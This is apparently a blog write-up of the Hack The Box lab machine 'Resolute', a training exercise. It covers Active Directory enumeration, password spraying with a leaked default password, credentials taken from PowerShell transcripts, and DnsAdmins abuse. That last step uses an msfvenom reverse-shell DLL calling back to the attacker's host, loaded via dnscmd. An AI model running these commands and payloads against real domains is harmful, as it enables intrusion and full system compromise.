---
layaout: post
title: Resolute Write Up HTB
date: 28-01-2025
categories: [Write ups]
tag: [Active Directory, Missconfigs, DnsAdmins, Password-Spraying]
---
![img-description](/assets/images/resolute.png)

**Resolute** is a medium-difficulty machine on Hack The Box that focuses on enumeration, privilege escalation, and exploiting misconfigurations in services and group memberships. The machine provides a hands-on opportunity to practice techniques related to Active Directory, DNS misconfigurations, and privilege escalation, ultimately leading to system-level access.

# ENNUMERATION
---
## Nmap scanning

---
````bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.169 -sCV -vvv

Host is up, received user-set (0.050s latency).
Scanned at 2025-01-29 00:44:09 CET for 87s
Not shown: 64948 closed tcp ports (reset), 563 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-01-28 23:51:35Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49686/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49907/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
51071/tcp open  unknown      syn-ack ttl 127
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h47m01s, deviation: 4h37m10s, median: 6m59s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 52471/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 47337/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 55070/udp): CLEAN (Timeout)
|   Check 4 (port 30335/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2025-01-28T15:52:29-08:00
| smb2-time: 
|   date: 2025-01-28T23:52:26
|_  start_date: 2025-01-28T23:19:16
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
````

By looking at the Nmap scan, we can notice that we are dealing with an Active Directory, so let's get to work

## Enumerating SMB as anonymous and guest
---
We start by enumerating SMB to see if we can find anything interesting, but unfortunately, we are unable to access it

````powershell
#GUEST
crackmapexec smb 10.10.10.169 -u 'guest' -p 'guest'
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\guest:guest STATUS_LOGON_FAILURE 
#ANONYMOUS
crackmapexec smb 10.10.10.169 -u '' -p ''
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\: 
````
## Enumerating RPC 
---

Since we didn't find anything useful in the SMB service, we’ll move on to testing a less commonly seen open port: **135**. This port is associated with **RPC (Remote Procedure Call)**, a protocol used by Windows systems to enable communication between different processes, often across a network. RPC is crucial for many administrative functions, such as managing users, groups, and network shares, especially in environments like Active Directory.

````powershell
rpcclient -U "" -N 10.10.10.169
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
````

Using the **querydispinfo** command, we can retrieve detailed information about user accounts on the target system. This command is particularly useful for listing display information, such as usernames, full names, and account descriptions, which can help identify potential accounts for further exploitation or enumeration.

````powershell
rpcclient $> querydispinfo
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail	Name: (null)	Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela	Name: (null)	Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette	Name: (null)	Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika	Name: (null)	Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire	Name: (null)	Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude	Name: (null)	Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia	Name: (null)	Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred	Name: (null)	Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo	Name: (null)	Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus	Name: (null)	Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie	Name: (null)	Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki	Name: (null)	Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo	Name: (null)	Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per	Name: (null)	Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan	Name: Ryan Bertrand	Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally	Name: (null)	Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon	Name: (null)	Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve	Name: (null)	Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie	Name: (null)	Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita	Name: (null)	Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf	Name: (null)	Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach	Name: (null)	Desc: (null)
````

Trying to log in into marko's account.

````powershell
❯ crackmapexec smb 10.10.10.169 -u marko -p 'Welcome123!'
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
````
## Password Spraying

---

After our failed attempts to log in as Marko, we’ll try a different approach. Considering that the default password assigned to new users on this AD is  **"Welcome123!"**, we’ll perform an attack known as **Password Spraying**.

**Password Spraying** is a technique where a single commonly used password is tested against multiple accounts. Unlike brute-force attacks, which target a single account with many password attempts, this method minimizes the risk of account lockouts by testing just one password across several accounts.

We start by creating our own wordlist. First, we copy all the usernames into a file named `raw.txt`. Then, using the following command, we will generate a list of usernames ready to use.
````bash
❯ grep -oP '(?<=user:\[)[^\]]+' raw.txt > users.txt
❯ cat users.txt
 File: users.txt
───────┼──────────────────────────────────────────────────────────────────────────────────
   1   │ Administrator
   2   │ Guest
   3   │ krbtgt
   4   │ DefaultAccount
   5   │ ryan
   6   │ marko
   7   │ sunita
   8   │ abigail
   9   │ marcus
  10   │ sally
  11   │ fred
  12   │ angela
  13   │ felicia
  14   │ gustavo
  15   │ ulf
  16   │ stevie
  17   │ claire
  18   │ paulo
  19   │ steve
  20   │ annette
  21   │ annika
  22   │ per
  23   │ claude
  24   │ melanie
  25   │ zach
  26   │ simon
  27   │ naoki
````

Next, using the following command with the **crackmapexec** tool, we initiate our **Password Spraying** attack.

````powershell
❯ crackmapexec smb 10.10.10.169 -u users.txt -p 'Welcome123!' --continue-on-success
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
````

# FOOTHOLD
---
During our previous enumeration with Nmap, we noticed that the WinRM port was open:

````bash
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
````

We will use the credentials we obtained to attempt to log in via WinRM, allowing us to begin our privilege escalation process.

````powershell
❯ nxc winrm 10.10.10.169 -u 'melanie' -p 'Welcome123!'

WINRM       10.10.10.169    5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)

❯  evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'

*Evil-WinRM* PS C:\Users\melanie\Desktop> ls


    Directory: C:\Users\melanie\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/28/2025   3:20 PM             34 user.txt

````

## AUTHENTICATED ENUMERATION

After running winPEAS we didnt find anything special

![Usersweb](/assets/resolute/winpeas.png)

Here’s a tip for many of the easy-to-medium difficulty machines: if you find any unusual program or folder in the filesystem root  **C:>**, always take a closer look. Many times, the path to privilege escalation can be found there.

![Usersweb](/assets/resolute/evilroot.png)

And in this case, that’s exactly what happened: we found the **PSTranscripts** folder (a folder where PowerShell transcripts are saved, often containing valuable information). Inside, we can see Ryan's credentials in plain text.

````powershell
*Evil-WinRM* PS C:\> Get-ChildItem -Path "C:\PSTranscripts" -Recurse -force


    Directory: C:\PSTranscripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
````

# PRIVILEGE ESCALATION
---
We log in with the new user and we found a note.

````powershell
❯ evil-winrm -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'
*Evil-WinRM* PS C:\Users\ryan\Desktop> cat note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
````

After doing some more enumeration, we realized that we belong to the **DnsAdmins** group. This group consists of users who have special permissions to manage and configure DNS settings on a Windows machine. Members of this group typically have the ability to create, modify, and delete DNS records in Active Directory-integrated zones. By default, this group does not have permission to start or stop the DNS service, but administrators can assign additional privileges to members, which may include the ability to control the DNS service.

In the case that we also have permission to restart the DNS service, we could create a malicious DLL plugin and execute it to escalate privileges.

````powershell
*Evil-WinRM* PS C:\Users\ryan\Desktop> whoami -groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
````

## Abusing DnsAdmins group
---

We create our malicious plugin using msfvenom

````bash
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f dll -o whare.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: whare.dll
````

We set the specified port to listen on our malicious plugin

````bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
````

After that, using the tool provided in Impacket, **smbserver.py** we create an SMB2 server

**Explanation of smbserver.py:** `smbserver.py` is a tool provided by the **Impacket** suite that allows you to set up an SMB (Server Message Block) server on the attacker's machine. This server enables the sharing of resources (files or directories) with other systems on the network. It is commonly used in penetration testing and exploitation to host malicious files that can be downloaded by victim machines. The SMB server created can be used to allow attackers to interact with a target system via the SMB protocol, which is commonly used in local area networks.

````bash
❯ python3 smbserver.py -smb2support whare /home/whare
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)
[*] User RESOLUTE\RESOLUTE$ authenticated successfully
[*] RESOLUTE$::MEGABANK:aaaaaaaaaaaaaaaa:a591615d121bb4874f990cfa7ec49812:0101000000000000801d48c3ee71db012d5f10e4726462be00000000010010004d004c00680065006900440074007500030010004d004c006800650069004400740075000200100050006c00730056006e004500560061000400100050006c00730056006e0045005600610007000800801d48c3ee71db0106000400020000000800300030000000000000000000000000400000572b2124a103d6fa528dfcf1a8d5a7ab4b68e7b593678bdc981d26b720cf2f550a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0039000000000000000000
````

From our **Evil-WinRM** session with the user **Ryan**, we launch it, and if successful, we will see in our **SMB server**: `User RESOLUTE\RESOLUTE$ authenticated successfully`

````powershell
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.14.9\whare\whare.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
````

Then, we will stop the DNS service and quickly restart it, as mentioned in the note we saw earlier—after 60 seconds, it will be reverted.

````powershell
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
 
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2664
        FLAGS              :
````

If everything has been done correctly, we will receive a shell as **NT AUTHORITY\System**

````powershell
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.169] 56614
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
````

````powershell
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D1AC-5AF6

 Directory of C:\Users\Administrator\Desktop

12/04/2019  05:18 AM    <DIR>          .
12/04/2019  05:18 AM    <DIR>          ..
01/28/2025  03:20 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,461,966,336 bytes free
````
![netrunner](/assets/images/netrunner.gif)